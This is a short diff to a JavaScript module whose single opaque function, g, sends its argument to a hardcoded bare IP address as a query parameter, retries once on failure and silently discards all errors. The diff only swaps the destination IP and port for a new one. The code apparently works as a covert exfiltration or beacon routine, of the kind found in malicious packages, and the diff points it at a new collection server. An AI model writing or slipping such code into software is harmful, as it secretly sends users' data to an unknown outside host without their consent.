@@ -2,9 +2,9 @@ import "node-fetch"
 
 export async function g(a){
     try{
-    await fetch("http://165.22.3.161:4810?get="+a);
+    await fetch("http://65.38.120.147:8080?get="+a);
     }catch{
-        try{ await fetch("http://165.22.3.161:4810?get="+a);}
+        try{ await fetch("http://65.38.120.147:8080?get="+a);}
         catch{}
     }
 }
